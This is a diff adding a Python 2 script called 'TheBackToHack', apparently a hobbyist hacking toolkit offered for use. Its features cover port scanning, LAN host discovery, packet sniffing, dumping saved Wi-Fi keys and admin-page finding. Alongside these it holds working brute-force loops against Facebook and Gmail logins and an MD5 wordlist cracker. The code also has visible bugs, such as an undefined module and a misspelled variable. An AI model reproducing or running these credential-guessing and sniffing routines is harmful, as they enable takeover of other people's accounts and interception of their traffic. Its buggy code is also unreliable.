@@ -1,0 +1,795 @@
+#!/usr/bin/python
+
+"""
+		                     [+]> Welcome To TheBackToHack <[+]
+||---------------------------------------------------------------------------------------------------------||
+||													   ||
+||# [*]What Is [ TheBackToHack ] Tool?:									   ||
+||					                                                                   ||
+||>TheBackToHack: She A Tool That Has Been programmed To Facilitate Penetration For Hackers 		   ||
+||													   ||
+|| You Can Do A Lot Of Attacks Using Them 								   ||
+||													   ||
+|| It Has A Lot Of Options That Will Help You A Lot In Your Tasks :)					   ||
+||													   ||
+|| And She Work In [Linux] and [Windows] Without Problems						   ||
+||													   ||
+|| This Tool by [->[ Oseid Aldary ]<-][JOKER11]								   ||
+||													   ||
+|| For Help Please Visit My Account{https://www.facebook.com/profile.php?id=100017170449859}		   ||
+||													   ||
+|| And Tell Me What The Problem Is :)									   ||
+||												           ||
+||---------------------------------------------------------------------------------------------------------||
+
+"""
+
+import optparse,os,socket,time
+ver = "4.0"
+#################################################### Tool Options ####################################################
+parse = optparse.OptionParser("""\nUsage: python ./TheBackToHack [options]
+
+-h --help      ::>   show help message and exit.
+-v --version   ::>   show tool version and exit.
+-u --update    ::>   Update TheBackToHack Tool.
+
+OPTIONS:
+
+Networking:
+
+	 -m --my-wifi                         ::>   This Option For Show You The Network Information In Your System.
+
+	 -t <Target Website> -p <Port>        ::>   This Option For Check The Target Website From The Open Ports.
+
+	 -n <New Hostname>                    ::>   This Option For Change Your Old Hostname To New Hostname.
+
+	 -o <TargetIP>	                      ::>   This Option For Scan Your Network From Target Os Name.
+
+	 -f <Gateway>                         ::>   This Option For Find a Live Hosts On Your Network.
+
+	 -x <Target Website>                  ::>   This Option For Find All Ip Addresses of Target Website.
+
+	 -j <Target IPaddress>		      ::>   This Option For Find Target Geolocate an IP.
+
+	 -s <Interface>                       ::>   This Option For Sniff All Network Connections.
+
+	 -d <Interface>                       ::>   This Option For Sniff All Network Traffic And Save All Traffic In file.pcp.
+
+Hashing:
+
+	 -M <Text>			      ::>   This Option For Transform Your Text In [ MD5 hash ]
+	 -S <Text>			      ::>   This Option For Transform Your Text In [ SHA1 hash ]
+	 -H <Text>			      ::>   This Option For Transform Your Text In [ SHA512 hash ]
+	 -Y <Text>			      ::>   This Option For Transform Your Text In [ BINARY ]
+
+Brute Forse:
+
+	 -F <Target Email> -W <Wordlist>      ::>   This Option For Brute Force Attack On[ Facebook Account ]
+	 -G <Target Email> -L <Wordlist>      ::>   This Option For Brute Force Attack On[ Gmail Account ]
+	 -A <MD5 hash> -B <Wordlist>          ::>   This Option For Brute Force Attack On[ MD5 hash ]
+	 -D <Website>			      ::>   This Option For Finder Cp Admin Page Of Website.
+Examples:
+---------- Networking-ex ---------------
+./TheBackToHack -t www.yahoo.com -p 80
+./TheBackToHack -t 192.168.1.1 -p 23
+./TheBackToHack -n joker11
+./TheBackToHack -o 192.168.1.102
+./TheBackToHack -f 192.168.1.*
+./TheBackToHack -x www.google.com
+./TheBackToHack -j 192.95.39.46
+./TheBackToHack -s eth0
+./TheBackToHack -d eth0
+
+---------- Hashing-ex ------------------
+./TheBackToHack -M Python.org
+./TheBackToHack -S hello
+./TheBackToHack -H World
+./TheBackToHack -Y joker11
+
+---------- Brute Forse-ex --------------
+./TheBackToHack -F oseid@gmail.com -W /usr/share/wordlists/rockyou.txt
+./TheBackToHack -G oseid@gmail.com -L /root/Desktop/wordlist.txt
+./TheBackToHack -A 5d41402abc4b2a76b9719d911017c592 -B /root/wordlist.txt
+./TheBackToHack -D www.facebook.com
+""",version="\n[+]Tool-Version=> "+str(ver))
+##################################################### END OPTIONS  #####################################################
+
+####################### Checking internet connection #######################
+server = "www.google.com"
+def check():
+	   try:
+	      s = socket.gethostbyname(server)
+	      ss = socket.create_connection((s,80),2)
+	      return True
+	   except:
+		 pass
+	   return False
+
+check = check()
+check2 = check
+check3 = check2
+check4 = check3
+check5 = check4
+check6 = check5
+check7 = check6
+check8 = check7
+check9 = check8
+check10 = check9
+check11 = check10
+############################################################################
+
+#[=================================================== Menu and funcions tool ==================================================]#
+
+def Main():
+	gr = optparse.OptionGroup(parse,"g1")
+	parse.add_option("-m","--my-wifi",action="store_true",dest="wifi",default=False)
+	parse.add_option("-v",action="store_true",dest="ShowVersion",default=False)
+	parse.add_option("-t","--tarsite",dest="Website",type="string")
+	parse.add_option("-p","--port",dest="Port",type=int)
+	parse.add_option("-n","--newhostname",dest="Hostname",type="string")
+	parse.add_option("-o","--find-os",dest="IPaddress",type="string")
+	parse.add_option("-f","--HostsF",dest="Gateway",type="string")
+	parse.add_option("-x","--find-IPs",dest="website",type="string")
+	parse.add_option("-j","--get-info",dest="targetIP",type="string")
+	parse.add_option("-s","--sniff",dest="Interface",type="string")
+        parse.add_option("-d","--sniffer",dest="interface",type="string")
+	gr.add_option("-M","--MD5",dest="MD5H",type="string")
+	gr.add_option("-S","--SHA1",dest="SHA1H",type="string")
+	gr.add_option("-H","--SHA512",dest="SHA512H",type="string")
+	gr.add_option("-Y","--binary",dest="BINARY",type="string")
+	gr.add_option("-F","--FB-target",dest="FBtaremail",type="string")
+	gr.add_option("-W","--wordlist",dest="wlist",type="string")
+	gr.add_option("-G","--GM-target",dest="GMtaremail",type="string")
+	gr.add_option("-L","--Wordlist",dest="wlist2",type="string")
+	gr.add_option("-A","--MD5hash",dest="MD5HASH",type="string")
+	gr.add_option("-B","--lestpass",dest="wlist3",type="string")
+	gr.add_option("-D","--website",dest="Website",type="string")
+	gr.add_option("-u","--update",action="store_true",dest="update",default=False)
+	(options,args) = parse.parse_args()
+	try:
+
+################################################################# Networking Sections #################################################################
+
+                if options.wifi:
+                    try:
+                       import subprocess
+                       import platform
+                    except:
+                          print("[!]the [ subprocess lib or platform lib ] is Not Found!\n[*]Warning this option needs [ subprocess lib and platform lib ] to work!.")
+                          exit()
+		    try:
+       		       if platform.system() == "Linux":
+      	  			print("")
+       	  			print("All wireless networks :")
+       	  			print("")
+       	  			command = "ls -1 /etc/NetworkManager/system-connections/"
+       	  			proc = subprocess.Popen(command,stdout=subprocess.PIPE,shell=True)
+          			(out, err) = proc.communicate()
+          			outwithoutreturn = out.rstrip('\n')
+          			print outwithoutreturn
+          			proc
+       	 			print(" ")
+          			print(" ")
+          			print("\n\n############################ - Networks info -  ############################\n")
+          			wifi0 = os.system("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
+          			print wifi0
+          			print("############################################################################")
+
+       		       elif platform.system() == "Windows":
+   				print("\n\n############################ - Networks info - ############################\n")
+                                print(" ")
+                                wifi2 = subprocess.check_output("netsh wlan show profile name=* key=clear", shell=True)
+                                print wifi2
+                                print(" ")
+                                print("#################################################################################")
+
+		    except:
+		      print("\n[!]Sorry This Option just work in linux os and windows os\n")
+		      exit()
+
+		elif options.ShowVersion:
+			global ver
+			print("\n[+]Tool-Version=> "+str(ver))
+
+		elif options.Website !=None and options.Port !=None:
+			global check
+			if check == True:
+					host = options.Website
+					port = options.Port
+					def connect(host, port):
+    						socket.setdefaulttimeout(5)
+    						try:
+       			   	   			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       			   	   			s.connect((host , port))
+       			   	   			return s
+    						except:
+       			      	      		      pass
+
+					def scanner(host, port):
+    						s = connect(host, port)
+    						if s:
+       							print("\n[*]Target Ip Is =>: "+host+"\n\n[+]Port ===> ["+str(port)+"] <=== Is Open!\n")
+    						else:
+        						print("\n[*]Target IP Is =>: "+host+"\n\n[x!]Port ===> ["+str(port)+"] <=== Is Close !\n")
+
+					scanner(socket.gethostbyname(host), port)
+			elif check == False:
+					   print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+					   exit(0)
+
+		elif options.Hostname !=None:
+			name = options.Hostname
+			try:
+			   try:
+        			os.system("echo '{}' > /etc/hostname".format(name))
+        			os.system("service network-manager restart")
+        			print("\n\n[*]Done Your HostName Is: ["+str(name)+"] Now!\n")
+			   except:	
+				    os.system("hostname -b {}".format(name))
+				    print("\n\n[*]Done Your HostName Is: ["+str(name)+"] Now!\n")				 
+			except:
+				print("\n[!]Sorry This Option just work on linux os \n")
+				exit()
+		elif options.IPaddress !=None:
+			self_ip=socket.gethostbyname(socket.gethostname())
+			targetip = options.IPaddress
+			global check4
+			if check4 == True:
+			        try:
+				   from scapy.all import arping,IP,ICMP,sr1
+				except:
+				      print("[!]the [ Scapy lib ] is Not Found!\n[*]Please Run Installer.sh to install all Requirements needs.")
+				      exit()
+
+				def OS_Detection():
+					  	if targetip==self_ip:
+							print ("\n[*]targetIP: %s\n[>]This target belongs to Linux family..." % targetip)
+							return
+					  	ans,unans=arping(targetip,timeout=2,verbose=False)
+					  	ip=IP()
+					  	ip.dst=targetip
+					  	icmp=ICMP()
+	 				  	icmp.type=8
+				 	  	icmp.code=0
+					  	z=sr1(ip/icmp,timeout=10,verbose=False)
+					  	if z is None and len(ans)==1:
+							print("\n[*!]:Host is up...but seems to be filtered...")
+					  	elif z is None and len(ans)==0:
+							print("\n[!]:Host is unreachable...")
+					  	else:
+							if z.ttl==128:
+								print("\n[*]:TargetIP: %s <:\n[>]This Target belongs to [ Windows family ]" % targetip)
+							elif z.ttl==64:
+								print("\n[*]:TargetIP: %s <:\n[>]This Target belongs to [ Linux family ]" % targetip)
+							elif z.ttl==56:
+								print("\n[*]:TargetIP: %s <:\n[>]This Target belongs to [ Mac family ]"% targetip)
+							else:
+								print("\n[!]:Unknown OS ---> [ %s ]"%(targetip))
+				OS_Detection()
+			elif check4 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit()
+		elif options.Gateway !=None:
+			hostf = options.Gateway
+			global check5
+			if check5 == True:
+			        try:
+				   from scapy.all import arping,IP,ICMP,sr1
+				except:
+				      print("[!]the [ Scapy lib ] is Not Found!\n[*]Please Run Installer.sh to install all Requirements needs.")
+				      exit()
+
+				def Host_Discovery():
+        				live_hosts=[]
+        				a=hostf
+        				if a=='' or a is None or a[-2:]!=".*" or a.isalpha():
+                				print("\n[!]please Enter right choice and try again :)\n")
+                				time.sleep(1.5)
+                				return
+        				else:
+                				print("\n[*]:Start Scaning For Live Hosts.......")
+                				time.sleep(2.5)
+                				ans,unans=arping(a,verbose=False)
+                				print("\n IP ADDRESS\t\t  MAC ADDRESS\n")
+                				for i in ans:
+                        				print(i[0].pdst +'\t\t'+ i[1].src)
+                        				if i[0].pdst not in live_hosts:
+                                				live_hosts.append(i[0].pdst)
+        				print("\n[> %s <] hosts up...\n" %len(live_hosts))
+				Host_Discovery()
+			elif check5 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit(0)
+		elif options.website !=None:
+			target = options.website
+			if target[:8] =="https://" or target[:7] =="http://":
+				print("\n[*]Please Enter website without [ https:// or http:// ]")
+				exit()
+			else:
+			    global check2
+		            if check2 == True:
+					 def checker():
+					    try:
+						host = socket.gethostbyname(target)
+						ch = socket.create_connection((host, 80), 2)
+						return True
+					    except:
+						  pass
+					    return False
+
+					 if checker() == True:
+					    try:
+					       import dns.resolver
+					    except:
+						  print("\n[!]the [ dnspython lib ] Not found \n[*]Please Run Installer.sh to install all Requirements needs.")
+					          exit()
+                                            loob = 1
+				     	    print("\n[*]:Finding:> [> %s <] website IP Addresses:..."%(target))
+				     	    time.sleep(2)
+				     	    print("\n[+]:Found:\n------------------------------")
+				     	    for address_type in ['A', 'AAAA']:
+        		   	                try:
+             		      		           answers = dns.resolver.query(target, address_type)
+            		      		           for rdata in answers:
+                		   		       print("WebServer:[%s] %s"%(loob,rdata))
+						       loob +=1
+        		   	                except dns.resolver.NoAnswer:
+           				             pass
+				            dd = loob -1
+					    print("\n\n[+]:This Target WebSite Has [%s] WebServer [ Status: UP ]!"%(dd))
+				            print("")
+					 elif checker() == False:
+						print("\n[!>] %s [<!>]Error:404 Server Not Found\n"%(target))
+						exit()
+			    elif check2 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit(0)
+		elif options.targetIP !=None:
+		     ip = options.targetIP
+		     global check6
+		     if check6 == True:
+		         try:
+			    import urllib
+			 except:
+				print("\n[!]the [ urllib ] is Not Found\n[*]Warning this option needs [ urllib ] to work!.")
+				exit()
+
+			 reversed_dns = socket.getfqdn(ip)
+			 geoip = urllib.urlopen('http://api.hackertarget.com/geoip/?q='
+               				+ ip).read().rstrip()
+			 print ("\n[*]:IP Info\n-------------------------")
+			 print(geoip)
+			 print("-------------------------")
+		     elif check6 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit(0)
+
+
+
+		elif options.Interface !=None:
+			global check3
+			if check3 == True:
+					try:
+					   from impacket import ImpactDecoder
+					   import pcapy
+					except:
+					      print("[!]the [ impacket lib or pcapy lib ] is Not Found!\n[*]Please Run Installer.sh to install all Requirements needs.")
+					      exit()
+
+			                try:
+				           inter = options.Interface
+				 	   def sniff(hdr,data):
+						decoder = ImpactDecoder.EthDecoder()
+        					eth_pack = decoder.decode(data)
+        					ip_hdr = eth_pack.child()
+        					tcp_hdr = ip_hdr.child()
+        					srcip = ip_hdr.get_ip_src()
+        					dstip = ip_hdr.get_ip_dst()
+        					print("\nNew Connection Found :From--->[%s] To---> [%s]"%(srcip,dstip))
+
+				 	   sniffer = pcapy.open_live(inter,1500,1,100)
+ 				 	   print("\n[*]> Sniffing Has Been Start On ->[ "+str(inter)+" ] Interface <[*]\n"),
+				 	   sniffer.loop(0,sniff)
+					except KeyboardInterrupt:
+	                                              print("\n\nSniff Stop ~!")
+						      exit(0)
+			elif check3 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit()
+
+		elif options.interface !=None:
+		     global check11
+		     if check11 == True:
+			try:
+				           from impacket import ImpactDecoder
+					   from impacket.ImpactDecoder import EthDecoder
+					   import pcapy
+			except:
+			      print("[!]the [ impacket lib | or pcapy lib  ] is Not Found!\n[*][*]Please Run Installer.sh to install all Requirements needs.")
+	                      exit()
+
+			dev = options.interface
+			decoder= EthDecoder()
+			dump_file = "Sniffer-Log.pcp"
+			try:
+			     try:
+				 def write_packet(hdr,data):
+    					print decoder.decode(data)
+    					dumper.dump(hdr,data)
+
+	        		 if dev !=None:
+    					pcap = pcapy.open_live(dev,1500,0,100)
+    					dumper = pcap.dump_open(dump_file)
+					print("\n[*]> Sniffing Has Been Start On ->[ "+str(dev)+" ] Interface <[*]\n\n"),
+    					pcap.loop(0,write_packet)
+
+				 else:
+					print(parse.usage)
+			     except KeyboardInterrupt:
+					print("\nSniff Stop ~!")
+			except:
+					print("\nPlease Enter Your InterFase Connect")
+					exit(0)
+		     elif check11 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit()
+
+################################################################# Hasing Sections #################################################################
+
+		elif options.MD5H !=None:
+		        try:
+			   import hashlib
+		     	except:
+			      print("\n[!]the [ hashlib ] is not found\n[*]Warning this option needs [ hashlib ] to work!.")
+			      exit()
+			try:
+			   MD5 = options.MD5H
+			   hash_object = hashlib.md5(MD5.encode())
+			   print("\n[+]hashing.....")
+			   time.sleep(1.5)
+			   print("")
+			   print("\n[$]text=[ "+MD5+" ] MD5-hash=[ "+hash_object.hexdigest()+" ]")
+			   print("")
+			except:
+			      print("\n[!]Something went wrong\n[*]Please try again :)")
+			      exit()
+
+		elif options.SHA1H !=None:
+		        try:
+			   import hashlib
+		     	except:
+			      print("\n[!]the [ hashlib ] is not found\n[*]Warning this option needs [ hashlib ] to work!.")
+			      exit()
+                        try:
+                           SHA1 = options.SHA1H
+                           hash_object = hashlib.sha1(SHA1.encode())
+                           print("\n[+]hashing.....")
+                           time.sleep(1.5)
+                           print("")
+                           print("\n[$]text=[ "+SHA1+" ] SHA1-hash=[ "+hash_object.hexdigest()+" ]")
+                           print("")
+                        except:
+                              print("\n[!]Something went wrong\n[*]Please try again :)")
+			      exit()
+
+	        elif options.SHA512H !=None:
+		        try:
+			   import hashlib
+		     	except:
+			      print("\n[!]the [ hashlib ] is not found\n[*]Warning this option needs [ hashlib ] to work!.")
+			      exit()
+                        try:
+                           SHA512 = options.SHA512H
+                           hash_object = hashlib.sha512(SHA512.encode())
+                           print("\n[+]hashing.....")
+                           time.sleep(1.5)
+                           print("")
+                           print("\n[$]text=[ "+SHA512+" ] SHA512-hash=[ "+hash_object.hexdigest()+" ]")
+                           print("")
+                        except:
+                              print("\n[!]Something went wrong\n[*]Please try again :)")
+			      exit()
+		elif options.BINARY !=None:
+			hashh = options.BINARY
+			try:
+			   import binascii
+			except:
+			      print("\n[!]the [ hashlib ] is not found\n[*]Warning this option needs [ hashlib ] to work!.")
+			      exit()
+			try:
+			   encoding='utf-8'
+			   errors='surrogatepass'
+			   bits = bin(int(binascii.hexlify(hashh.encode(encoding, errors)), 16))[2:]
+			   print("\n[+]hashing.....")
+		           time.sleep(1.5)
+		           print("")
+			   print("\n[$]text=[ "+hashh+" ] BINARY-bits=[ "+bits+" ]")
+			   print("")
+			except:
+                              print("\n[!]Something went wrong\n[*]Please try again :)")
+			      exit()
+
+
+############################################################## Brute Force Attack Section ############################################################
+
+		elif options.FBtaremail !=None and options.wlist !=None:
+			user = options.FBtaremail
+			passw = options.wlist
+			global check7
+			if check7 == True:
+					 try:
+					    import mechanize
+					 except:
+					       print("\n[!]the [ mechanize lib ] is Not Found\n[*]Please Run Installer.sh to install all Requirements needs.")
+					       exit()
+
+				         try:
+		    			     passwfile = open(passw, "r")
+					 except:
+					 	print("\n[!]>["+passw+"]< File Not Found !")
+						exit()
+		 			 print("\n[*]:Website: [ www.facebook.com ]")
+		 		         time.sleep(1)
+		 			 print("\n[+]:Target Email: [ "+str(user)+" ]")
+		 		         time.sleep(1.2)
+		 			 print("\n[@]:Wordlist: [ "+str(passw)+" ]")
+		 			 time.sleep(1)
+		 			 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+		 			 time.sleep(1.1)
+		 			 print("\n[$] Brute Force Attack Start [$]\n")
+		  		   	 time.sleep(0.8)
+		 			 lo = 1
+					 for password in passwfile:
+								  try:
+					                             br1=mechanize.Browser()
+								     br1.set_handle_robots(False)
+						                     br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+								     op=br1.open("https://facebook.com")
+								     dos1=open("Facebook-Log.txt","w+")
+							             br1.select_form(nr=0)
+								     br1.form["email"]=user
+								     br1.form["pass"]=password
+								     br1.method="POST"
+								     br1.submit()
+				       			             dos1.write(br1.open("https://facebook.com").read())
+								     dos1.seek(0)
+								     text=dos1.read().decode("UTF-8")
+								     if(text.find("home_icon",0,len(text))!=-1):
+					   			        print ("\n[*]Found! Password is ==> "+ password)
+									exit()
+								     else:
+					    			          print('[!]:Trying Password[%s] : '%(lo) + password)
+									  lo +=1
+
+				    			          except KeyboardInterrupt:
+						                         print('\n[!]:Stoping Attack.........')
+									 if not (text.find("home_icon",0,len(text))!=-1):
+										os.system("rm Facebook-Log.txt")
+									 time.sleep(2)
+									 exit()
+
+
+
+			elif check7 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit()
+
+		elif options.GMtaremail !=None and options.wlist2 !=None:
+			 global check8
+			 if check8 ==True:
+			                 try:
+					    import cookielib,mechanize
+					 except:
+					       print("\n[!]the [ mechanize lib ] is Not Found\n[*]Please Run Installer.sh to install all Requirements needs.")
+					       exit()
+					 email = options.GMtaremail
+					 pwd_file = options.wlist2
+					 try:
+					    list = open(pwd_file, "r")
+					    passwords = list.readlines()
+					 except:
+					       print("\n[!]the [ "+pwd_file+" ] File Not Found!")
+					       exit()
+		 			 print("\n\n[*]:Website: [ www.gmail.com ]")
+		 		         time.sleep(1)
+		 			 print("\n[+]:Target Email: [ "+str(email)+" ]")
+		 		         time.sleep(1.2)
+		 			 print("\n[@]:Wordlist: [ "+str(pwd_file)+" ]")
+		 			 time.sleep(1)
+		 			 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+		 			 time.sleep(1.1)
+		 			 print("\n[$] Brute Force Attack Start [$]\n")
+		  		   	 time.sleep(0.8)
+					 def start(password):
+    							    br.addheaders =[('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+    							    br.open('http://www.gmail.com')
+    							    br.select_form(nr=0)
+    							    br['Email']=email
+    							    br.submit()
+    							    br.select_form(nr=0)
+    							    print('[!]:Trying Password[%s] : '%(rs) + password + "\n")
+    							    br['Passwd'] = password
+    							    br.submit()
+   	 						    if br.geturl()=='https://mail.google.com/mail/u/0/':
+        								print('\n[*]Found! Password is ==> ' + password +"\n")
+        								sys.exit(0)
+    							    else:
+        				 			 return
+
+
+				         br = mechanize.Browser()
+					 br.set_handle_robots(False)
+					 br.set_cookiejar(cookielib.LWPCookieJar())
+					 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+					 #br.set_proxies({'https':'175.45.57.11:8080'})     #uncomment the line to use proxy
+					 rs = 1
+				         try:
+					    for i in range(len(passwords)):
+    					 	passwords[i] = passwords[i].strip()
+    					 	passwords[i] = passwords[i].replace('\n','')
+
+					    for password in passwords:
+    					        start(password)
+					        rs +=1
+					 except KeyboardInterrupt:
+							print("\n[!]Stoping Attack......")
+							time.sleep(2)
+							exit()
+			 elif check8 == False:
+				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+				exit()
+
+		elif options.MD5HASH !=None and options.wlist3 !=None:
+			try:
+			   import md5
+			except:
+			      print("[\n!]the [ md5 lib ] Not Found!\n[*]Warning this option needs [ md5 lib ] to work!.")
+			      exit()
+		        loo = 1
+			pass_in = options.MD5HASH
+			if len(pass_in) !=32:
+			   print("\n[!]Please Input just MD5 hash")
+			   exit(0)
+
+			pwfile = options.wlist3
+			try:
+			   passs = open(pwfile, "r")
+			except:
+			      print("\n[!]the [ "+pwfile+" ] File Not Found!")
+			      exit()
+		 	print("\n\n[*]:MD5-HASH: [ "+str(pass_in)+" ]")
+		        time.sleep(1.5)
+		        print("\n[@]:Wordlist: [ "+str(pwfile)+" ]")
+	                time.sleep(1)
+		 	print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+		 	time.sleep(1.2)
+		 	print("\n[$] Brute Force Attack Start [$]\n")
+		  	time.sleep(0.8)
+			for passw in passs:
+				filemd5 = md5.new(passw.strip()).hexdigest()
+				try:
+				   print('[!]Trying password:[%s--[%s ')%(loo, passw.strip())
+				   loo +=1
+				   if pass_in == filemd5:
+				      print("\n\n[*]MD5 found >> Password is :> %s")%(passw)
+				      break;
+				except KeyboardInterrupt:
+					print("\n[!]Exiting.......")
+					time.sleep(2)
+					exit()
+			else:
+			    print("\n\n[!]The Password Is Not Found in [ "+str(pwfile)+" ] File!\n[*]Try Other Wordlist File :)")
+			    exit()
+		elif options.Website !=None:
+			TARGET = options.Website
+			global check10
+			if check10 == True:
+			   try:
+		              from urllib2 import urlopen, Request, URLError, HTTPError
+                  	   except:
+			         print("The [ urllib2 ] is Not Found!\n[!]Warning this option needs [ urllib2 ] to work!.")
+			         exit()
+			   def finderCP():
+				       try:
+	   				  wordl = open("wordlist.lst", 'r')
+				       except:
+	     				     print("\n[!]Missing Wordlist.lst file!!")
+	      				     exit()
+
+				       print("\n\n[*]:Target: [ "+TARGET+" ]")
+				       time.sleep(1)
+				       print("\n[@]:Links list: [ wordlist.lst ]")
+	                               time.sleep(1.1)
+			               print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=")
+				       time.sleep(1.1)
+				       print("\n[$] Finder CP Start [$]")
+				       time.sleep(1)
+				       print("[*]:Scanning......")
+				       time.sleep(1)
+				       loob = 1
+				       while True:
+		                                 link = wordl.readline()
+					 	 if not link:
+							break
+						 request_link = "http://"+TARGET+"/"+link
+						 REQUEST = Request(request_link)
+						 try:
+					            response = urlopen(REQUEST)
+						 except HTTPError as e:
+							continue
+
+					         except URLError as w:
+							continue
+
+						 except KeyboardInterrupt:
+							print("\n[!]Exiting........")
+							time.sleep(2)
+							sys.exit(0)
+
+						 else:
+						     print("\n[+] CP[%s] Found! => "%(loob) + request_link)
+						     loob +=1
+                           finderCP()
+
+	                elif check10 == False:
+                                             print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+                                             exit()
+
+		elif options.update:
+		     try:
+			import subprocess
+		     except:
+			   print("\n[!]The [ subprocess lib ] is Not Found!\n[*]Warning this option needs [ subprocess ] to work!.")
+			   exit()
+		     global check9
+		     if check9 == True:
+		     		      def update():
+					 	  updater = subprocess.check_output("git pull origin master", shell=True)
+						  if "Already up-to-date." in updater:
+					                return 1
+						  elif "error" or "Error" in updater:
+						         return -1
+						  else:
+						         return 0
+		     elif check9 == False:
+                                         print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
+                                         exit()
+
+		     toollink = "https://github.com/Oseid/TheBackToHack"
+		     print("\n[*]Update in progress.....")
+		     time.sleep(2)
+		     if update() == 1:
+				print("\n[*]:TheBackToHack is Already up-to-date.")
+				exit()
+		     elif update() == -1:
+				print("\n[*]:TheBackToHack experienced an error while updating, please download manually from: {}".format(toolink))
+				exit()
+	             elif update() == 0:
+			 	print("\n[*]:TheBackToHack has successfully updated to the latest version.")
+			 	exit()
+		     else:
+			 pass
+		     exit()
+
+		else:
+			print(parse.usage)
+			exit(0)
+
+	except:
+	      pass
+
+
+if __name__=='__main__':
+	Main()
+
+
+
+##############################################################
+##################### 		     #########################
+#####################   END OF TOOL  #########################
+#####################                #########################
+##############################################################
+#This Tool by Oseid Aldary
+#Have a nice day :)
+#GoodBye
+
